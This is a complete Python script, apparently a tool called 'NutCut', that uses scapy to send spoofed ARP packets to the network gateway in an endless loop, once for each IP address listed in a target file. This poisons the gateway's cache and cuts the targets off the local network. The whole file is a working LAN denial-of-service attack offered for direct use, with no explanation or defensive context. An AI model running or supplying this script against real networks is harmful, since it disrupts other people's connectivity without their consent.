from warnings import filterwarnings
filterwarnings("ignore")
from scapy.all import *

try:
    gateway_ip = conf.route.route("0.0.0.0")[2]
except Exception:
    print("Error: Unable to get gateway IP")
    exit()

def nutcut(target_ip):
    pkt = ARP(psrc=target_ip, pdst=gateway_ip)
    send(pkt, verbose=0, loop=1)

def main():
    import threading
    import os

    if not os.path.exists("./target_ips.txt"):
        open("./target_ips.txt", "w")
        print("Error: target_ips.txt not found. Created for you, please edit it")
        return
    
    with open("./target_ips.txt", "r") as file:
        target_list = file.read().strip().splitlines()
        file.close()
    
    if not target_list:
        print("Error: target_ips.txt is empty. Please edit it first")
        return
    
    print(f"Target Count: {len(target_list)}\n")

    for target_ip in target_list:
        print(f"NutCut initializing agaisn't {target_ip}")
        threading.Thread(target=nutcut, args=[target_ip], daemon=True).start()
    
    try:
        input("\n: Press Enter or CTRL+C to stop :")
    except KeyboardInterrupt:
        return

if __name__ == "__main__":
    print("\033[?25l", end="")
    main()
    print("\033[?25h", end="")
